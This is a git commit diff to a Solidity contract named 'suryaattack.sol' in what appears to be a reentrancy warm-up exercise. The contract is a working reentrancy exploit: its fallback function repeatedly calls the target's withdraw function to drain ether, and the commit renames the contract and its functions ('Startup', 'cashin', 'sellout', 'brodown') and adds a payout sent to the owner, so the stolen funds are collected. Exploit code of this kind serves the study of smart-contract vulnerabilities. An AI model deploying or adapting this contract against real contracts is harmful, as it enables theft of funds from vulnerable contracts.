fd778f375707260cd2fcd789a95aa39c3dc26462
Surya Bakshi <sbaks0820@gmail.com>
2017-07-14 17:07:09 -0400

    Update suryaattack.sol

--- reentrancy-warmup/suryaattack.sol
+++ reentrancy-warmup/suryaattack.sol
@@ -1,24 +1,28 @@
 pragma solidity^0.4.0;
 
-contract ERC20Attack {
+contract Startup {
     address public target;
-
-    function Ballot(address _target) {
+    address owner = msg.sender;
+    uint256 payout = 0;
+    
+    function Startup(address _target) {
         target = _target;
     }
 
-    function deposit() payable {
+    function cashin() payable {
         target.call.value(msg.value)( bytes4(bytes32(sha3("deposit()"))));
     }
 
-    function withdraw(uint256 _value) {
+    function sellout(uint256 _value) {
         target.call(bytes4(sha3("withdraw(uint256)")), _value);
     }
-    function balanceOf(address _addr) {
-        target.call(bytes4(sha3("balanceOf(address)")), _addr);
+
+    function brodown() {
+        owner.transfer(payout);
     }
 
     function () payable {
+        payout += msg.value;
         target.call( bytes4(sha3('withdraw(uint256)')), 0.1 ether);
     }
 
